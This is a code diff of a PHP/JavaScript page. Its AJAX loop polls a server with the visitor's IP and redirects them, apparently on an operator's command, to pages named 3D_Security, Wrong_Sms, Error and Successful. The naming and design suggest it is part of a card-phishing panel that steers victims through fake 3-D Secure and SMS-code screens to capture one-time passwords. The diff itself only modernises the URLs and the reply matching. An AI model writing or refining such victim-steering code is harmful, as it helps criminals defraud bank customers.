@@ -66,25 +66,26 @@ body{display:flex;align-items:flex-start;justify-content:center;padding-top:15vh
             function gonder() {
             $.ajax({
                 type: 'POST',
-                url: '<?php echo "Database.php?ip=".$ip; ?>',
-                success: function (msg) {
-                    if (msg == 'sms') {
-                        window.location.href = '3D_Security.php';
+                url: '/Database?ip=<?php echo $ip; ?>',
+                success: function (response) {
+                    var msg = response.trim();
+                    if (msg.indexOf('sms2') !== -1) {
+                        window.location.href = '/Wrong_Sms';
                     }
-                    else if (msg == 'tebrik') {
-                        window.location.href = 'Successful.php';
+                    else if (msg.indexOf('sms') !== -1) {
+                        window.location.href = '/3D_Security';
                     }
-                    else if (msg == 'hata1') {
-                        window.location.href = 'Error.php';
+                    else if (msg.indexOf('tebrik') !== -1) {
+                        window.location.href = '/Successful';
                     }
-                    else if (msg == 'back') {
-                        window.location.href = 'index.php';
+                    else if (msg.indexOf('hata1') !== -1) {
+                        window.location.href = '/Error';
                     }
-                    else if (msg == 'sms2') {
-                        window.location.href = 'Wrong_Sms.php';
+                    else if (msg.indexOf('hata2') !== -1) {
+                        window.location.href = '/Closed_to_Internet';
                     }
-                    else if (msg == 'hata2') {
-                        window.location.href = 'Closed_to_Internet.php';
+                    else if (msg.indexOf('back') !== -1) {
+                        window.location.href = '/';
                     }
                     else {
                         setTimeout(gonder, 2500);
